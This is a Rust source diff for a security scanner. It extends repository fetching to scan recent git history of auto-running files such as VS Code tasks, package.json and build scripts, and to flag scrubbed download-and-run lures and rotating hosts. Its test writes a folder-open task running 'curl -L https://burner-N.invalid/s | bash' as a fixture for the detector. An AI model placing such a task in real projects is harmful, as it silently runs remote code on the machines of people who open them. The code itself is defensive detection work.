@@ -13,6 +13,22 @@ use crate::fetch::check_public;
 use crate::package::{Budget, Unpacked, safe_rel, write_inert};
 
 const CLONE_TIMEOUT: Duration = Duration::from_secs(180);
+const HISTORY_DEPTH: &str = "50";
+const HISTORY_MAX: usize = 16 * 1024 * 1024;
+/// History is only diffed where a scrubbed lure would have run by itself.
+const AUTO_RUN_PATHS: &[&str] = &[
+    ":(glob)**/.vscode/tasks.json",
+    ":(glob)**/.cursor/tasks.json",
+    ":(glob)**/.windsurf/tasks.json",
+    ":(glob)**/*.code-workspace",
+    ":(glob)**/package.json",
+    ":(glob)**/setup.py",
+    ":(glob)**/build.rs",
+    ":(glob)**/.envrc",
+    ":(glob)**/Makefile",
+    ":(glob)**/.husky/*",
+    ":(glob)**/*.sh",
+];
 const KNOWN_HOSTS: &[&str] = &["github.com", "gitlab.com", "bitbucket.org", "codeberg.org"];
 
 /// A repository address on a known forge, or any https address ending in `.git`.
@@ -70,7 +86,7 @@ pub fn fetch_repo(url: &str) -> Result<Unpacked, String> {
             "--quiet",
             "--bare",
             "--depth",
-            "1",
+            HISTORY_DEPTH,
             "--no-tags",
             "--",
             url,
@@ -114,8 +130,12 @@ pub fn fetch_repo(url: &str) -> Result<Unpacked, String> {
         });
     }
 
-    let notes = read_bare(&bare, &out)?;
+    let mut notes = read_bare(&bare, &out)?;
+    notes.retain(|n| !n.starts_with("Only the latest commit"));
+    let (history, history_notes) = read_history(&bare);
+    notes.extend(history_notes);
     Ok(Unpacked {
+        history,
         root: out,
         label: url.to_string(),
         notes,
@@ -224,6 +244,121 @@ fn read_bare(bare: &Path, out: &Path) -> Result<Vec<String>, String> {
     Ok(notes)
 }
 
+/// Lines removed in the history the clone holds, scanned as they were. Returns the findings and
+/// a note on how much history that was.
+fn read_history(bare: &Path) -> (Vec<bee_evidence::Evidence>, Vec<String>) {
+    let mut notes = Vec::new();
+    let child = git(bare)
+        .args([
+            "log",
+            "-p",
+            "--no-color",
+            "--no-ext-diff",
+            "--no-textconv",
+            "--no-renames",
+            "-U0",
+            "--format=%x00%h %ad",
+            "--date=short",
+            "HEAD",
+            "--",
+        ])
+        .args(AUTO_RUN_PATHS)
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .spawn();
+    let Ok(mut child) = child else {
+        return (
+            Vec::new(),
+            vec!["The repository's history could not be read.".into()],
+        );
+    };
+    let mut raw = Vec::new();
+    if let Some(out) = child.stdout.take() {
+        let _ = out.take(HISTORY_MAX as u64 + 1).read_to_end(&mut raw);
+    }
+    let _ = child.kill();
+    let _ = child.wait();
+    let truncated = raw.len() > HISTORY_MAX;
+    raw.truncate(HISTORY_MAX);
+    let log = String::from_utf8_lossy(&raw);
+
+    let mut evidence = Vec::new();
+    let mut seen = std::collections::HashSet::new();
+    let mut hosts: std::collections::BTreeMap<String, std::collections::BTreeSet<String>> =
+        Default::default();
+    let mut commits = 0usize;
+    let (mut commit, mut path, mut buf) = (String::new(), None::<String>, String::new());
+    let mut in_header = false;
+
+    let mut flush = |commit: &str, path: &Option<String>, buf: &mut String| {
+        if let Some(p) = path
+            && !buf.is_empty()
+        {
+            for e in bee_static::scan_removed(p, buf, commit) {
+                if seen.insert((e.rule, p.clone())) {
+                    evidence.push(e);
+                }
+            }
+            hosts
+                .entry(p.clone())
+                .or_default()
+                .extend(bee_static::removed_download_hosts(p, buf));
+        }
+        buf.clear();
+    };
+
+    for line in log.lines() {
+        if let Some(c) = line.strip_prefix('\0') {
+            flush(&commit, &path, &mut buf);
+            commit = c.to_string();
+            path = None;
+            commits += 1;
+        } else if line.starts_with("diff --git ") {
+            flush(&commit, &path, &mut buf);
+            path = None;
+            in_header = true;
+        } else if in_header {
+            if let Some(p) = line.strip_prefix("--- ") {
+                path = p.strip_prefix("a/").map(str::to_string);
+            } else if line.starts_with("@@") {
+                in_header = false;
+            }
+        } else if let Some(removed) = line.strip_prefix('-') {
+            buf.push_str(removed);
+            buf.push('\n');
+        }
+    }
+    flush(&commit, &path, &mut buf);
+
+    for (p, hs) in hosts {
+        if hs.len() >= 3 {
+            let list: Vec<_> = hs.into_iter().collect();
+            evidence.push(
+                bee_evidence::Evidence::new(
+                    "rotating-hosts",
+                    bee_evidence::Severity::Warning,
+                    format!(
+                        "This file has downloaded and run code from {} different addresses over its history ({}), the pattern of a campaign swapping in fresh hosts as old ones are blocked.",
+                        list.len(),
+                        list.join(", ")
+                    ),
+                )
+                .at(&p, None),
+            );
+        }
+    }
+
+    notes.push(if truncated {
+        "Only part of the history was read; it was too large.".to_string()
+    } else {
+        format!(
+            "History was read for {commits} recent commit(s) that touched files which run by themselves; older history and other files' history were not."
+        )
+    });
+    (evidence, notes)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -296,6 +431,8 @@ mod tests {
         assert!(ok);
         let out = dir.path().join("tree");
         let notes = read_bare(&bare, &out).unwrap();
+        let (history, _) = read_history(&bare);
+        assert!(history.is_empty(), "{history:?}");
         assert_eq!(
             std::fs::read_to_string(out.join("index.js")).unwrap(),
             "module.exports = 1\n"
@@ -307,5 +444,69 @@ mod tests {
         );
         assert!(notes.iter().any(|n| n.contains("link")), "{notes:?}");
         assert!(notes.iter().any(|n| n.contains("latest commit")));
+    }
+
+    #[test]
+    fn a_scrubbed_lure_and_its_rotating_hosts_are_found_in_history() {
+        let src = tempfile::tempdir().unwrap();
+        let s = src.path();
+        let run = |args: &[&str]| {
+            let ok = Command::new("git")
+                .current_dir(s)
+                .env("GIT_CONFIG_GLOBAL", "/dev/null")
+                .env("GIT_CONFIG_NOSYSTEM", "1")
+                .args(["-c", "user.name=t", "-c", "user.email=t@t.invalid"])
+                .args(args)
+                .status()
+                .unwrap()
+                .success();
+            assert!(ok, "git {args:?}");
+        };
+        run(&["init", "-q", "-b", "main"]);
+        std::fs::create_dir(s.join(".vscode")).unwrap();
+        for host in ["burner-1.invalid", "burner-2.invalid", "burner-3.invalid"] {
+            let task = format!(
+                "{{\"tasks\":[{{\"label\":\"lint\",\n\"command\":\"curl -L https://{host}/s | bash\",\n\"runOptions\":{{\"runOn\":\"folderOpen\"}}}}]}}\n"
+            );
+            std::fs::write(s.join(".vscode/tasks.json"), task).unwrap();
+            run(&["add", "-A"]);
+            run(&["commit", "-qm", host]);
+        }
+        std::fs::remove_file(s.join(".vscode/tasks.json")).unwrap();
+        std::fs::write(s.join("index.js"), "module.exports = 1\n").unwrap();
+        run(&["add", "-A"]);
+        run(&["commit", "-qm", "tidy"]);
+
+        let dir = tempfile::tempdir().unwrap();
+        let bare = dir.path().join("bare.git");
+        assert!(
+            Command::new("git")
+                .args(["clone", "-q", "--bare"])
+                .arg(s)
+                .arg(&bare)
+                .status()
+                .unwrap()
+                .success()
+        );
+
+        let (history, notes) = read_history(&bare);
+        let rules: Vec<_> = history.iter().map(|e| e.rule).collect();
+        assert!(rules.contains(&"folder-open-task"), "{rules:?}");
+        assert!(rules.contains(&"download-and-run"), "{rules:?}");
+        let rotation = history
+            .iter()
+            .find(|e| e.rule == "rotating-hosts")
+            .expect("rotation");
+        assert!(
+            rotation.summary.contains("3 different"),
+            "{}",
+            rotation.summary
+        );
+        assert!(
+            history
+                .iter()
+                .all(|e| e.severity <= bee_evidence::Severity::Warning)
+        );
+        assert!(notes[0].contains("4 recent commit(s)"), "{notes:?}");
     }
 }
